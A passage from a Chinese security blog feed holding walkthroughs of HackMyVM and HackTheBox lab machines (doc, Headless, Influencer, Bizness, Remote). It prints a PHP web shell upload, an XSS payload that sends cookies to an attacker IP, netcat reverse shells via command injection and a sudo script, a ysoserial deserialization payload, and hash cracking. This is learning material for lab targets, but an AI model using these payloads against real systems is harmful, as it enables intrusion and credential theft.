<p>找到账号密码，登陆到后台，找到漏洞库（<a class="link"   href="https://www.exploit-db.com/exploits/50389%EF%BC%89%E8%AF%B4%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%AA%E4%BA%BA%E5%A4%B4%E5%83%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E5%85%88%E6%8A%93%E4%B8%AA%E5%8C%85" >https://www.exploit-db.com/exploits/50389）说的漏洞点，也就是个人头像修改文件上传，先抓个包<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101948.png" ></p>
<p>然后按照poc发送包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /classes/Users.php?f=save HTTP/1.1</span><br><span class="line">Host: doc.hmv</span><br><span class="line">Content-Length: 1018</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Origin: http://doc.hmv</span><br><span class="line">Referer: http://doc.hmv/admin/?page=user</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: PHPSESSID=smop95l7ie9o8dn57cv56s1so8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">John</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">Smith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">jsmith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;x&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_REQUEST[&#x27;x&#x27;]) &#123;</span><br><span class="line">  system($_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">  &#125; else phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh--</span><br></pre></td></tr></table></figure>

<p>发送成功后，头像从原来有张图片到现在加载不出来，在图片那里右键打开图片链接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102116.png" ></p>
<p>文件上传利用成功，接下来就输入nc反弹一个shell即可</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102209.png" ></p>
<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102250.png" ></p>
<p>在&#x2F;var&#x2F;www&#x2F;html的目录下找到数据库账号密码，也有看到bella用户，然后就尝试用这个登陆bella，成功</p>
<p>然后sudo -l查到doc可以利用，先执行看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102530.png" ></p>
<p>它打开了本地7890端口，再拿一个shell然后用socat转发端口看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102829.png" ></p>
<p>看起来是个文件管理系统，看了题解才知道这是pydoc，他是有漏洞的，一个思路是“&#x2F;getfile?key&#x3D;”后面跟上文件名就能读取到想要的文件，就可以&#x2F;getfile?key&#x3D;&#x2F;root&#x2F;root.txt</p>
<p>还有一个思路是在tmp目录下创建一个py文件，然后在见面搜索访问，也能执行我们想要的语句。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104332.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104446.png" ></p>
<p>提权成功</p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这个靶机相对简单，也有一定的曲折，最后的pydoc没接触过，值得学习。</p>
<p>doc的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/usr/bin/pydoc3.9 -p 7890&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb headless复盘</title>
    <url>/2024/04/05/htb-headless%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>刚开始接触htb，感觉很有收获，记录一下</p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Headless" >https://app.hackthebox.com/machines/Headless<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.8</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到22端口和5000端口，5000端口是upnp服务，要用http协议访问</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405110933.png" ></p>
<p>能看到一个表单，思路是ssti，sql注入，xss，先尝试ssti</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405111018.png" ></p>
<p>被拦截了，而且信息还说会把相关信息发给管理员，<strong>思路来了，这地方就可以考虑xss</strong></p>
<p>构造一个恶意xss数据包，同时还要在本地用python开启一个http服务看返回的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5666</span><br></pre></td></tr></table></figure>

<p>发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /support HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">Content-Length: 59</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: &lt;img src=15m0 onerror=fetch(&quot;http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.11.8:5000/support</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fname=1&amp;lname=1&amp;email=1@1.com&amp;phone=1&amp;message=1%0a&#123;&#123;1*1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>User-Agent: &lt;img src&#x3D;15m0 onerror&#x3D;fetch(“<a class="link"   href="http://10.10.16.19:5666/?cookie=%22+document.cookie);%3E" >http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;<i class="fas fa-external-link-alt"></i></a></strong>  重点是这个</p>
<p>然后等待一下，就弹回了cookie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112257.png" ></p>
<p>同时dirsearch扫出来dashboard目录</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112318.png" ></p>
<p>拿到了cookie在访问dashboard就不会401了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112541.png" ></p>
<h4 id="Userflag"><a href="#Userflag" class="headerlink" title="Userflag"></a>Userflag</h4><p>抓包发现有post发送了了一个date数据，这里的思路是命令注入，有点难想到吧</p>
<p>在date后面加；然后写入命令反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dashboard HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.11.8:5000/dashboard</span><br><span class="line">Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">date=2023-09-15;nc -e /bin/bash 10.10.16.19 1234</span><br></pre></td></tr></table></figure>

<p>nc开启监听，成功拿到shell，拿到user.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405113521.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l 查到一个syscheck，是个脚本文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114121.png" ></p>
<p>主要调用了initdb.sh，那思路就是往里面写命令就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; &gt; initdb.sh</span><br></pre></td></tr></table></figure>

<p>然后sudo &#x2F;usr&#x2F;bin&#x2F;syscheck，本地开启监听</p>
<p>成功拿到root</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114946.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场还是挺简单的，比较有特色的是5000端口判断xss那里，体验了真实构造恶意代码拿到cookie，还有命令注入那里比较难想，提权就还好。</p>
<h5 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h5><p><a class="link"   href="https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c" >https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/m0_60351808/article/details/137128551" >https://blog.csdn.net/m0_60351808/article/details/137128551<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm influencer复盘</title>
    <url>/2024/04/05/hackmyvm-influencer%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Influencer" >https://hackmyvm.eu/machines/machine.php?vm=Influencer<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.115(后变成116)</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到2121端口（是ftp服务（和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154528.png" ></p>
<p>无密码连接ftp，有一个note.txt提示有个wordpress站点，还有很多张图片，用工具分析了图片，找到snapchat.jpg有隐藏信息</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154710.png" ></p>
<p>给了一串密码，还要看用户名</p>
<p>看看80端口，到目录扫到&#x2F;wordpress，很容易就找到登录口，用wpscan扫描，扫到一个用户名luna，尝试用刚刚到密码登录，失败，rockyou.txt爆破也没有结果，然后就去站点本身看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155202.png" ></p>
<p>看到有关luna的个人信息，用社工工具生成一个字典</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-05%2015.54.55.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155651.png" ></p>
<p>然后用wpscan爆破出密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155805.png" ></p>
<p>成功爆破出来，登录后台</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155939.png" ></p>
<p>找到appearance-&gt;theme file editor，修改php文件，写入后门文件，本地开启监听</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160202.png" ></p>
<p>成功拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160255.png" ></p>
<h4 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h4><p>ss -lntp查看开放了什么端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160424.png" ></p>
<p>注意到有个1212端口，先用socat转发出去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:4444,fork TCP:localhost:1212 &amp; </span><br></pre></td></tr></table></figure>

<p>然后访问4444端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160617.png" ></p>
<p>看来是个ssh服务，那就用ssh连接，用最开始在图片里拿到的密码，成功登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh luna@192.168.64.116 -p 4444</span><br><span class="line">密码：u3jkeg97gf</span><br></pre></td></tr></table></figure>

<p>然后使用sudo -l查到juan可以免密码执行exiftool</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160840.png" ></p>
<p>再查询知道exiftool可以写文件，<strong>思路是在juan的.ssh目录下写一个authorized_keys</strong>,然后ssh连接登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luna@influencer:~$ cd /tmp</span><br><span class="line">luna@influencer:/tmp$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8pW4mmY4tPKfm6n1XBJldNxoo+ehIpzS1Y1kI32qU8fLVbraU85pjcPUK7pHcvoKfBl02hjpKhsTSHHG5iEsaCAMrD8euYDfNRKu0ITfX5EukM8JhDXEgWzGWlieF9KEB0haZJyFm6lIVPK950FtElXNZGagQ3wyQoVGRnoUhTlyeK5BcFbFlnMZdndOEB8TPOTzc13SpfCSU7lF4YckPjqgV1Y45kDEvJViv9xMPEd0be80F+lJ1J2/qywFTySfVlOqsFOzp3m3fLyUb80yk8Qs0BSR5q1NXexHXfCPwBbDW6vX4iygbSm1TRei2kre0CvsqUEgGipCmJTdkPQyr+ZFTZl/0DlSX07ZSrat9NAbXc+MfG5j0QsgebkjR4aWQxAym/yEfe7WGyOZdf43rxzS61dToq9CBrTQUapmwg6efBTwlEeMVA+fSK5bqxDvD1quCLoMrSonc7v4OKkopaB3hUfdM/YwGexHk7DLtsE50O80wMajhYy8aR4N4aI8= root@kali&#x27; &gt; abc</span><br><span class="line">luna@influencer:/tmp$ chmod 777 abc</span><br><span class="line">luna@influencer:/tmp$ sudo -u juan /usr/bin/exiftool -filename=/home/juan/.ssh/authorized_keys abc</span><br></pre></td></tr></table></figure>

<p>成功在本地登录</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161301.png"   style="zoom:50%;" >

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到是免密码执行一个脚本，脚本内容是给server.hmv发送请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161444.png" ></p>
<p>然后查到&#x2F;etc&#x2F;hosts有写的权限，那么思路是修改&#x2F;etc&#x2F;hosts，<strong>把server.hmv的地址配置为自己kali的ip，开启apache服务并且在目录下新建一个98127651的文件</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161658.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161859.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161931.png" ></p>
<p>执行命令后再查看&#x2F;bin&#x2F;bash的权限</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162027.png" ></p>
<p>最后bash -p重新进入bash，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162119.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场虽然是medium，但是思路都是比较常见的，感觉做完是在回顾前段时间学到的东西。涉及的知识点：wpscan扫描，爆破密码，社工工具生成字典，wordpress后台写入后门，socat端口转发，exiftool读写文件，&#x2F;etc&#x2F;hosts配置。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb bizness复盘</title>
    <url>/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.252</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
<p>先下载ysoserial.jar生成base64的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<p>然后发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>成功拿到第一个shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>

<p>使用hashid识别一下加密类型</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
<p>猜测是120模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<p>爆出来的密码是monkeybizness</p>
<p>然后直接su - root登录，权限就到root了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb remote复盘</title>
    <url>/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>为了学windows渗透相关内容，昨天冲动了一把买了htb一个月的会员，为了不浪费这一百块钱，接下来要好好学！</p>
<p>先做的第一个就是remote靶机，全程看着wp做的，相比linux，很多东西都是陌生的，还是要多做多复盘才能熟悉这个体系，让知识深入我心。</p>
<h5 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h5><p>官方wp</p>
<p><a class="link"   href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.10.180</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
<p>一个一个看，开了21端口，用anonymous登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
<p>没有什么可以利用的，切换到下一个端口</p>
<p>来到80端口，是个http服务，wappalyzer识别出是Umbraco的CMS</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
<p>然后找到一个登陆点</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >

<p>发现需要email，扫目录也没扫出什么，再看看其他端口,2049端口有nfs服务，showmount看看有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
<p><code>showmount -e</code> 是 NFS 命令的一部分，用于显示远程 NFS 服务器上共享的目录列表。</p>
<p>有个目录，把它给挂载出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>

<p><code>-t nfs</code>: 指定要挂载的文件系统类型为 NFS。</p>
